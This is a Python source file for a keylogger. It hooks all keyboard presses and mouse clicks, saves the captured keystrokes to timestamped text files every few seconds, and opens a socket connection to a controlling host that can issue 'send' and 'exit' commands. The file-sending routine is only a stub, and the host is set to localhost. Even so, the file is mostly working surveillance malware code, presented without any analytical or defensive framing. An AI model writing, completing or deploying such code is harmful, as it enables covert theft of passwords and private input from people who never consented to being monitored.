# -*- coding: utf-8 -*-
import keyboard
import mouse
from threading import Timer
from datetime import datetime
from socket import socket

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.sock = socket()
        self.host = "127.0.0.1"
        self.port = 1005

    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"
    
    def write_keylogs_to_file(self):
        filename = f"keylog-{self.start_time_str}_{self.end_time_str}"

        with open(f"{filename}.txt", "w", encoding="utf-8") as file:
            file.write(self.log)
        print(f"Saved {filename}.txt")

    def report(self):
        if self.log:
            self.end_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            self.write_keylogs_to_file()
            self.start_time_str = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def connect_to_host(self):
        self.sock.connect((self.host, self.port))

    def send_keylog_files_to_host(self):
        self.sock.send(bytes("data", 'ascii'))

    def start(self):
        self.connect_to_host()

        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_callback)
        self.report()
        
        #keyboard.wait()
        while True:
            recv = self.sock.recv(1024)
            if recv:
                recv = str(recv)[2:-1]

                if recv == "exit":
                    self.sock.send(bytes("terminating", 'ascii'))
                    self.sock.close()
                    break
                elif recv == "send":
                    self.send_keylog_files_to_host()
                else:
                    self.sock.send(bytes("received", 'ascii'))
                    print(recv)

if __name__ == "__main__":
    keylogger = Keylogger(interval=5)
    keylogger.start()